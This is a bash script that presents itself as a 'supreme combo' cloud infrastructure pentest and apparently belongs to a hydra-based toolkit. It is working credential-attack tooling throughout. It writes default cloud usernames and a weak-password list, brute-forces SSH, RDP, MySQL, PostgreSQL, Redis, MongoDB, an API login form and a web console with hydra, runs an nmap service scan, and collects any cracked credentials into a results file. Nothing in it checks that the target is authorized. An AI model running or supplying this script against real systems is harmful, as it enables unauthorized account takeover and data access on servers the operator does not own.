#!/bin/bash

# ═══════════════════════════════════════════════════════════════════
# 🚀 SUPREME COMBO: CLOUD INFRASTRUCTURE (AWS/Azure/GCP)
# Tests cloud-based services and management interfaces
# SSH + RDP + MySQL + PostgreSQL + Web APIs + S3/Blob Storage
# ═══════════════════════════════════════════════════════════════════

# ════════════════════════════════════════════════════════════════
# ⚡ CONFIGURATION - Replace with actual target ⚡
# ════════════════════════════════════════════════════════════════
TARGET="cloud-server.yourtarget.com"  # Cloud instance IP/hostname - REPLACE THIS
CLOUD_PROVIDER="aws"                   # aws, azure, or gcp
API_ENDPOINT="/api/v1/login"           # API authentication endpoint
# ════════════════════════════════════════════════════════════════

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"

source "$PROJECT_ROOT/scripts/logger.sh" 2>/dev/null || true
source "$PROJECT_ROOT/scripts/vpn_check.sh" 2>/dev/null && require_vpn "false"

OUTPUT_DIR="$PROJECT_ROOT/results/combinations"
mkdir -p "$OUTPUT_DIR"

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="$OUTPUT_DIR/combo_supreme_cloud_${CLOUD_PROVIDER}_${TARGET//[.:\/]/_}_${TIMESTAMP}.log"
RESULTS_FILE="$OUTPUT_DIR/combo_supreme_cloud_${CLOUD_PROVIDER}_${TARGET//[.:\/]/_}_${TIMESTAMP}_results.txt"

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

clear
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo -e "${WHITE}  🚀 SUPREME COMBO: CLOUD INFRASTRUCTURE PENTEST${NC}" | tee -a "$LOG_FILE"
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo -e "${GREEN}  Target:${NC}         ${BOLD}$TARGET${NC}" | tee -a "$LOG_FILE"
echo -e "${GREEN}  Provider:${NC}       ${BOLD}$CLOUD_PROVIDER${NC}" | tee -a "$LOG_FILE"
echo -e "${GREEN}  API Endpoint:${NC}   ${BOLD}$API_ENDPOINT${NC}" | tee -a "$LOG_FILE"
echo -e "${GREEN}  Started:${NC}        $(date)" | tee -a "$LOG_FILE"
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

# Cloud-specific usernames
USERLIST="$PROJECT_ROOT/config/admin_usernames.txt"
PASSLIST="$PROJECT_ROOT/config/admin_passwords.txt"

if [ ! -f "$USERLIST" ]; then
    case "$CLOUD_PROVIDER" in
        aws)
            cat > "$USERLIST" << EOF
ec2-user
ubuntu
admin
root
centos
bitnami
EOF
            ;;
        azure)
            cat > "$USERLIST" << EOF
azureuser
admin
administrator
root
ubuntu
EOF
            ;;
        gcp)
            cat > "$USERLIST" << EOF
admin
root
ubuntu
debian
centos
EOF
            ;;
        *)
            cat > "$USERLIST" << EOF
admin
root
ubuntu
EOF
            ;;
    esac
fi

if [ ! -f "$PASSLIST" ]; then
    cat > "$PASSLIST" << EOF

password
Password123
admin
Admin123
cloud123
P@ssw0rd
changeme
welcome123
letmein
EOF
fi

FOUND_CREDS=()

# ═══════════════════════════════════════════════════════════════════
# PHASE 1: REMOTE ACCESS (SSH/RDP)
# ═══════════════════════════════════════════════════════════════════
echo -e "${PURPLE}━━━ Phase 1: Remote Access Services ━━━${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

# SSH
echo -e "${BLUE}[1.1]${NC} Testing SSH (Port 22)..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 32 -w 15 -f "ssh://$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
    if grep -q "login:" "$LOG_FILE" 2>/dev/null; then
        echo -e "   ${GREEN}✓ SSH Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_CREDS+=("SSH")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# RDP (if Windows-based cloud)
echo -e "${BLUE}[1.2]${NC} Testing RDP (Port 3389)..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 8 -w 45 -f "rdp://$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
    if grep -q "login:" "$LOG_FILE" 2>/dev/null; then
        echo -e "   ${GREEN}✓ RDP Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_CREDS+=("RDP")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# ═══════════════════════════════════════════════════════════════════
# PHASE 2: DATABASE SERVICES
# ═══════════════════════════════════════════════════════════════════
echo -e "${PURPLE}━━━ Phase 2: Cloud Database Services ━━━${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

# MySQL/RDS
echo -e "${BLUE}[2.1]${NC} Testing MySQL/RDS (Port 3306)..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 24 -w 20 -f "mysql://$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
    if grep -q "login:" "$LOG_FILE" 2>/dev/null; then
        echo -e "   ${GREEN}✓ MySQL Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_CREDS+=("MySQL")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# PostgreSQL
echo -e "${BLUE}[2.2]${NC} Testing PostgreSQL (Port 5432)..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 20 -w 25 -f "postgres://$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
    if grep -q "login:" "$LOG_FILE" 2>/dev/null; then
        echo -e "   ${GREEN}✓ PostgreSQL Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_CREDS+=("PostgreSQL")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# Redis (common in cloud)
echo -e "${BLUE}[2.3]${NC} Testing Redis (Port 6379)..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -P "$PASSLIST" -t 16 -w 10 -f "redis://$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
    if grep -q "login:" "$LOG_FILE" 2>/dev/null; then
        echo -e "   ${GREEN}✓ Redis Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_CREDS+=("Redis")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# MongoDB
echo -e "${BLUE}[2.4]${NC} Testing MongoDB (Port 27017)..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 16 -w 20 -f "mongodb://$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
    if grep -q "login:" "$LOG_FILE" 2>/dev/null; then
        echo -e "   ${GREEN}✓ MongoDB Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_CREDS+=("MongoDB")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# ═══════════════════════════════════════════════════════════════════
# PHASE 3: WEB/API INTERFACES
# ═══════════════════════════════════════════════════════════════════
echo -e "${PURPLE}━━━ Phase 3: Web & API Interfaces ━━━${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

# API Endpoint
echo -e "${BLUE}[3.1]${NC} Testing API Authentication..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 16 -f \
        "https-post-form://$TARGET$API_ENDPOINT:username=^USER^&password=^PASS^:F=error" \
        2>&1 | tee -a "$LOG_FILE" || true
    if grep -q "login:" "$LOG_FILE" 2>/dev/null; then
        echo -e "   ${GREEN}✓ API Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_CREDS+=("API")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# Web Console
echo -e "${BLUE}[3.2]${NC} Testing Web Management Console..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 16 -f \
        "https-post-form://$TARGET/console/login:user=^USER^&pass=^PASS^:F=invalid" \
        2>&1 | tee -a "$LOG_FILE" || true
    if grep -q "login:" "$LOG_FILE" 2>/dev/null; then
        echo -e "   ${GREEN}✓ Web Console Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_CREDS+=("WebConsole")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# ═══════════════════════════════════════════════════════════════════
# PHASE 4: COMPREHENSIVE PORT SCAN
# ═══════════════════════════════════════════════════════════════════
echo -e "${PURPLE}━━━ Phase 4: Service Discovery ━━━${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

if command -v nmap &>/dev/null; then
    echo -e "${BLUE}[4.1]${NC} Scanning cloud services..." | tee -a "$LOG_FILE"
    nmap -Pn -sV -p 22,80,443,3306,3389,5432,6379,8080,8443,9000,27017 -T4 "$TARGET" 2>&1 | tee -a "$LOG_FILE"
fi
echo "" | tee -a "$LOG_FILE"

# ═══════════════════════════════════════════════════════════════════
# FINAL SUMMARY
# ═══════════════════════════════════════════════════════════════════
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo -e "${WHITE}  ✅ CLOUD INFRASTRUCTURE PENTEST COMPLETE${NC}" | tee -a "$LOG_FILE"
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

if [ ${#FOUND_CREDS[@]} -gt 0 ]; then
    echo -e "${GREEN}🎉 CREDENTIALS DISCOVERED:${NC}" | tee -a "$RESULTS_FILE"
    for service in "${FOUND_CREDS[@]}"; do
        echo -e "   ${GREEN}✓${NC} $service" | tee -a "$RESULTS_FILE"
    done
    echo "" | tee -a "$RESULTS_FILE"
    grep -E "login:|password:|host:" "$LOG_FILE" | tee -a "$RESULTS_FILE"
else
    echo -e "${YELLOW}ℹ No credentials found.${NC}" | tee -a "$RESULTS_FILE"
fi

echo "" | tee -a "$LOG_FILE"
echo -e "${BLUE}📊 Attack Summary:${NC}" | tee -a "$LOG_FILE"
echo -e "   Cloud Provider: $CLOUD_PROVIDER" | tee -a "$LOG_FILE"
echo -e "   Services Tested: Remote Access (2), Databases (4), Web/API (2)" | tee -a "$LOG_FILE"
echo -e "   Successful: ${#FOUND_CREDS[@]}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

echo -e "${BLUE}📁 Output Files:${NC}" | tee -a "$LOG_FILE"
echo -e "   Log: $LOG_FILE" | tee -a "$LOG_FILE"
echo -e "   Results: $RESULTS_FILE" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo -e "${PURPLE}⚡ CLOUD PENTEST POWERED BY HYDRA-TERMUX ULTIMATE${NC}" | tee -a "$LOG_FILE"
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
